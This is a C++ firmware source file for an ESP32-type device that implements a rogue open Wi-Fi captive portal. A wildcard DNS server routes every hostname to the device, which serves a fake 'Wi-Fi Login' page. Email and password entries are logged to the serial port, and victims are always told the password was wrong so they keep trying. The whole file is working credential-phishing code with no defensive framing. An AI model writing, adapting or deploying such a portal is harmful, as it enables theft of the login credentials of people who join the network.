#include "../wifi.hpp"

#ifdef MOD_WIFI_PORTAL
	#include <WiFi.h>
	#include <DNSServer.h>
	#include <WebServer.h>

	static DNSServer dns;
	static WebServer web(80);

	static const char page[] = R"HTML(<!DOCTYPE html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Sign in</title>
<style>body{font-family:sans-serif;max-width:20rem;margin:3rem auto;padding:0 1rem}
input{width:100%;padding:.6rem;margin:.4rem 0;box-sizing:border-box}
button{width:100%;padding:.6rem;background:#0a7;color:#fff;border:0}</style></head>
<body><h2>Wi-Fi Login</h2><p>Sign in to access the internet.</p>
<form method=POST action=/login>
<input name=u placeholder=Email autocapitalize=off>
<input name=p type=password placeholder=Password>
<button>Connect</button></form></body></html>)HTML";

	static void serve() { web.send(200, "text/html", page); } // also catches captive-detect urls

	static void login() {
		Serial.printf("creds u=%s p=%s\n", web.arg("u").c_str(), web.arg("p").c_str());
		web.send(200, "text/html", "<p>Wrong password, try again.</p><a href=/>back</a>");
	}

	void portalInit() {
		WiFi.mode(WIFI_AP);
		WiFi.softAP(MOD_WIFI_PORTAL_SSID); // open
		dns.start(53, "*", WiFi.softAPIP()); // all names -> us
		web.on("/", serve);
		web.on("/login", HTTP_POST, login);
		web.onNotFound(serve);
		web.begin();
		Serial.printf("portal up '%s' @ %s\n", MOD_WIFI_PORTAL_SSID, WiFi.softAPIP().toString().c_str());
	}

	void portalTick() {
		dns.processNextRequest();
		web.handleClient();
	}
#endif
